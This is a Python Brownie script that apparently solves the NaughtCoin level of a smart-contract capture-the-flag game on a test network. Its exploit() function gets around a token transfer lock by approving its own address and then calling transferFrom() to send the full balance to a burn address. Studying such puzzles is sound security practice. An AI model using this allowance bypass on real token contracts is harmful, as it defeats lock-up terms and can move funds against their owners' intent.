from brownie import accounts, NaughtCoin

# load account
account = accounts.load("Rinkeby_Test_Net_Account")
# get instance
instance_address = "0xfc187A6A470eAB778A5d76aDcC7F9157cf6A7518"
naught_coin = NaughtCoin.at(instance_address)

# set variables
my_address = account.address
BURN = "0x0000000000000000000000000000000000000001"

# ------------------------------------------------------
# complete this level by getting your token balance to 0
#
# we can bypass transfer by using approve() and transferFrom()
# ------------------------------------------------------


def level_completed():
    return naught_coin.balanceOf(my_address) == 0


def exploit():
    # view address of player
    print(f"The address of player is: {naught_coin.player()}")

    # view balance of player (our balance)
    balance = naught_coin.balanceOf(my_address)
    print(f"Our balance is: {balance}")

    # call approve for our hacker contract's address
    tx = naught_coin.approve(my_address, balance, {"from": account})
    tx.wait(1)

    # call transferFrom
    tx = naught_coin.transferFrom(my_address, BURN, balance, {"from": account})
    tx.wait(1)

    # confirm that we have completed the level
    print(f"We have completed the level: {level_completed()}")


def main():
    exploit()
